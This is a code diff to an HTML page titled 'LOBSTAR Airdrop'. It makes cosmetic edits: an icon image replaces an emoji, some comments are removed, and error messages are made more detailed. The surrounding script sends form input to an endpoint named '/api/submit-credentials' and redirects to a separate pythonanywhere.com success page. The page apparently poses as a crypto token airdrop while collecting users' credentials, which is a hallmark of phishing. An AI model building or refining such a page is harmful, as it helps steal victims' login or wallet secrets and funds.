@@ -6,6 +6,7 @@
     <title>LOBSTAR Airdrop</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <style>
+        /* ========== STYLES (unchanged) ========== */
         * {
             margin: 0;
             padding: 0;
@@ -309,10 +310,10 @@
 </head>
 <body>
 <div class="container">
-    <!-- Circular coin banner -->
+    <!-- Circular coin banner with image (replace src with your own) -->
     <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
         <div style="width: 80px; height: 80px; background: radial-gradient(circle at 30% 30%, #f97316, #facc15); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(249,115,22,0.5);">
-            <span style="font-size: 3rem;">🦞</span>
+            <img src="https://cdn-icons-png.flaticon.com/512/3095/3095154.png" alt="LOBSTAR" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
         </div>
     </div>
 
@@ -547,7 +548,6 @@
         btn.disabled = true;
 
         try {
-            // Use relative URL for Vercel serverless function
             const response = await fetch('/api/submit-credentials', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -560,14 +560,13 @@
             });
             const data = await response.json();
             if (data.success) {
-                // Redirect to success page
                 window.location.href = 'https://funiec.pythonanywhere.com/success/success.html';
             } else {
                 alert('Error: ' + (data.message || 'Unknown error'));
             }
         } catch (err) {
-            console.error(err);
-            alert('Connection error. Please try again later.');
+            console.error('Fetch error:', err);
+            alert('Connection error: ' + err.message);
         } finally {
             btn.innerText = originalText;
             btn.disabled = false;
